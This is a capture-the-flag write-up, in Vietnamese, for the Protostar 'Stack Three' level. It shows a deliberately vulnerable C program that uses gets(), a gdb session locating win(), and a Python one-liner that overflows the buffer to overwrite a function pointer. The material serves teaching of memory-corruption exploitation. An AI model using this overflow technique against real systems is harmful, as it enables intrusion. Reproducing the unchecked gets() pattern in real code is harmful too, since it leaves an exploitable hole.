# STACK THREE

## About

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

  * both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Solutions

`STACK THREE` quay lại với khai thác buffer overflow thông qua hàm nhập stdin gets().

Trong source code ta thấy hàm main khai báo một con trỏ hàm `volatile int (*fp)();`, con trỏ này nhận giá trị bằng 0 và nếu được thay đổi thỏa mãn điều kiện != 0 nó sẽ được gọi và chuyển flow chương trình tới địa chỉ mà nó trỏ tới. Và đề bài yêu cầu flow đến hàm `win()`, vậy nên điều đầu tiên đó là tìm địa chỉ của `win()` và sau đó ghi đè nó vào con trỏ hàm fp.

Tìm địa chỉ hàm win() qua gdb:

```
root@protostar:/opt/protostar/bin# gdb -q ./stack3                                                      
Reading symbols from /opt/protostar/bin/stack3...done.                                                  
(gdb) set disassembly-flavor intel                                                                      
(gdb) p win                                                                                             
$1 = {void (void)} 0x8048424 <win>                                                                      
(gdb)  
```

Việc tiếp theo là overwrite vào biến `fp` với giá trị là địa chỉ `win()` đã tìm ra ở trên:

```
root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "\x24\x84\x04\x08"' | ./stack3           
calling function pointer, jumping to 0x08048424                                                         
code flow successfully changed
```

## Documents

<https://en.wikipedia.org/wiki/Stack-based_memory_allocation>

<https://www.educative.io/edpresso/what-is-gets-in-c>

<https://en.wikipedia.org/wiki/Endianness>



